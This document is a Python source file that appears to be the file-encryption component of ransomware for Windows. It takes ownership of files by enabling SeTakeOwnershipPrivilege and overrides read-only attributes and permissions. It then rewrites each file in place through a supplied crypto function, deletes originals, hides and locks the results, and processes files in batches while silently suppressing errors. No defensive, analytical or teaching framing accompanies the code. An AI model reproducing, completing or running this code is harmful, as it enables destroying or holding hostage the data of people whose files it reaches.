import os
import tempfile
import shutil
import ctypes
import win32api
import win32con
import win32security
import sys

def modify_file_inplace(filepath, crypto_function):
    """
    Modify a file in place using the provided crypto function.
    This function handles file locking, permissions, and large files.
    """
    # Take ownership of file if on Windows
    if os.name == 'nt':
        try:
            # Disable read-only attribute
            ctypes.windll.kernel32.SetFileAttributesW(filepath, 128)  # FILE_ATTRIBUTE_NORMAL
            
            # Take ownership
            filename = os.path.basename(filepath)
            SE_TAKE_OWNERSHIP_NAME = "SeTakeOwnershipPrivilege"
            hToken = win32security.OpenProcessToken(
                win32api.GetCurrentProcess(),
                win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
            )
            win32security.AdjustTokenPrivileges(hToken, False, 
                [(win32security.LookupPrivilegeValue(None, SE_TAKE_OWNERSHIP_NAME), 
                win32security.SE_PRIVILEGE_ENABLED)])
            
            # Change ownership to current user
            security_info = win32security.OWNER_SECURITY_INFORMATION
            current_user = win32security.GetTokenInformation(hToken, win32security.TokenUser)
            win32security.SetNamedSecurityInfo(filepath, win32security.SE_FILE_OBJECT,
                security_info, current_user, None, None, None)
        except:
            pass
    
    # Process the file
    try:
        # For very large files, process in chunks
        file_size = os.path.getsize(filepath)
        
        if file_size > 100 * 1024 * 1024:  # If file > 100MB, process in chunks
            process_large_file(filepath, crypto_function)
        else:
            process_regular_file(filepath, crypto_function)
    except PermissionError:
        # Try to force delete and recreate
        try:
            os.chmod(filepath, 0o777)
            process_regular_file(filepath, crypto_function)
        except:
            pass
    except Exception as e:
        # Last resort - try to copy and replace
        try:
            temp_fd, temp_path = tempfile.mkstemp()
            with open(filepath, 'rb') as infile:
                with os.fdopen(temp_fd, 'wb') as outfile:
                    data = infile.read()
                    encrypted_data = crypto_function(data)
                    outfile.write(encrypted_data)
            
            # Force replace
            os.remove(filepath)
            shutil.move(temp_path, filepath)
        except:
            pass

def process_regular_file(filepath, crypto_function):
    """Process a regular sized file"""
    temp_fd, temp_path = tempfile.mkstemp()
    
    try:
        # Read original file
        with open(filepath, 'rb') as f:
            original_data = f.read()
        
        # Apply crypto function
        modified_data = crypto_function(original_data)
        
        # Write to temp file
        with os.fdopen(temp_fd, 'wb') as f:
            f.write(modified_data)
        
        # Replace original with temp file
        os.replace(temp_path, filepath)
        
    except Exception as e:
        # Clean up temp file if something went wrong
        if os.path.exists(temp_path):
            os.remove(temp_path)
        raise e

def process_large_file(filepath, crypto_function):
    """Process a large file in chunks to save memory"""
    temp_fd, temp_path = tempfile.mkstemp()
    chunk_size = 1024 * 1024  # 1MB chunks
    
    try:
        with open(filepath, 'rb') as infile:
            with os.fdopen(temp_fd, 'wb') as outfile:
                while True:
                    chunk = infile.read(chunk_size)
                    if not chunk:
                        break
                    encrypted_chunk = crypto_function(chunk)
                    outfile.write(encrypted_chunk)
        
        # Replace original with temp file
        os.replace(temp_path, filepath)
        
    except Exception as e:
        if os.path.exists(temp_path):
            os.remove(temp_path)
        raise e

def lock_file(filepath):
    """Lock the file to prevent access"""
    if os.name == 'nt':
        try:
            # Set file to read-only and hidden
            ctypes.windll.kernel32.SetFileAttributesW(filepath, 2 | 1)  # HIDDEN | READONLY
        except:
            pass

def modify_files_batch(file_list, crypto_function):
    """Modify multiple files in batch"""
    success_count = 0
    fail_count = 0
    
    for filepath in file_list:
        try:
            modify_file_inplace(filepath, crypto_function)
            success_count += 1
        except:
            fail_count += 1
    
    return success_count, fail_count
